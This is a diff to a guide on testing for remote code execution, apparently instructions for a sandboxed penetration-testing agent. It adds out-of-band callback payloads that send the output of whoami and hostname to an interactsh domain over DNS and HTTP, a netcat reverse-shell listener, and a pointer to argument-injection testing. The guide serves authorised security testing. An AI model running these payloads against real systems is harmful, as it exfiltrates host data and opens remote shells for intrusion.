@@ -41,14 +41,18 @@ Remote code execution leads to full server control when input reaches code execu
 
 ### OAST
 
+Use `interactsh-client -v` in the sandbox to mint a unique callback
+domain (`*.oast.fun`); substitute it for `attacker.tld` below. Each
+invocation prints inbound DNS/HTTP hits to stdout in real time.
+
 **DNS**
 ```bash
-nslookup $(whoami).x.attacker.tld
+nslookup $(whoami).xyz.oast.fun
 ```
 
 **HTTP**
 ```bash
-curl https://attacker.tld/$(hostname)
+curl https://xyz.oast.fun/$(hostname)
 ```
 
 ### Output-Based
@@ -76,6 +80,7 @@ curl https://attacker.tld/$(hostname)
 - Break out of quoted segments by alternating quotes and escapes
 - Environment expansion: `$PATH`, `${HOME}`, command substitution
 - Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`
+- When a shell-free subprocess (`execve`/`subprocess.run([...])`) receives a user-controlled argument, load `argument_injection` to test option smuggling and any separately identified argv or secondary-parser boundary.
 
 **Path and Builtin Confusion**
 - Force absolute paths (`/usr/bin/id`) vs relying on PATH
@@ -232,6 +237,13 @@ pop graphic-context
 5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
 6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
 7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops
+
+## Tooling
+
+- Reverse-shell listener: `ncat -lvnp 4444` (in the sandbox; `ncat` is the
+  netcat variant that ships in the image). Pair with a one-shot shell
+  payload only when OAST + selective reads are insufficient — never
+  drop a persistent shell when a single targeted command will prove it.
 
 ## Summary
 
